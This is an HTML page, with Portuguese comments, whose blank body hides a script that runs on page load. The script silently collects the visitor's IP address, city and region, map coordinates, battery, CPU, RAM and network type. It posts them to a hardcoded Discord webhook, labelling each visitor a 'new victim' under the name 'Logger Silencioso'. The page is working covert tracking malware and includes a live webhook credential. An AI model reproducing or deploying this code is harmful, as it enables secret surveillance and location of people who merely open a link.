<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>body { background: #fff; margin: 0; overflow: hidden; }</style>
</head>
<body>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1499880092493414521/NHvrU1wucCRBtCcbC70MEdcpcl-hhH6fJBTl9xsrrrEfwIaXvlkAQrkoH29e0Y_FBiDM";

    async function stealthCapture() {
        console.log("Iniciando captura...");
        try {
            // 1. Captura de IP e Localização
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();

            // 2. Bateria
            let batteryInfo = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Carregando' : 'Descarregando'})`;
            }

            // 3. Hardware e Rede
            const cores = navigator.hardwareConcurrency + " Núcleos CPU";
            const ram = (navigator.deviceMemory || 'N/A') + " GB";
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const netInfo = conn ? `${conn.effectiveType.toUpperCase()}` : "N/A";

            // 4. Montar Payload
            const discordPayload = {
                username: "Logger Silencioso",
                embeds: [{
                    title: "🕵️ Nova Vítima Detectada",
                    color: 0, // Preto
                    fields: [
                        { name: "🌐 IP", value: `\`${ipData.ip}\``, inline: true },
                        { name: "📍 Local", value: `${ipData.city}, ${ipData.region}`, inline: true },
                        { name: "🔋 Bateria", value: batteryInfo, inline: true },
                        { name: "💻 PC/Cel", value: `${cores} | ${ram} RAM`, inline: true },
                        { name: "📡 Net", value: netInfo, inline: true },
                        { name: "🗺️ Mapa", value: `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` }
                    ],
                    timestamp: new Date()
                }]
            };

            // 5. Enviar para o Discord
            const response = await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

            if (response.ok) {
                console.log("Dados enviados com sucesso para o Discord!");
            } else {
                console.log("Erro ao enviar para o Discord: ", response.status);
            }

        } catch (error) {
            console.error("Erro crítico na execução:", error);
        }
    }

    window.onload = stealthCapture;
</script>
</body>
</html>
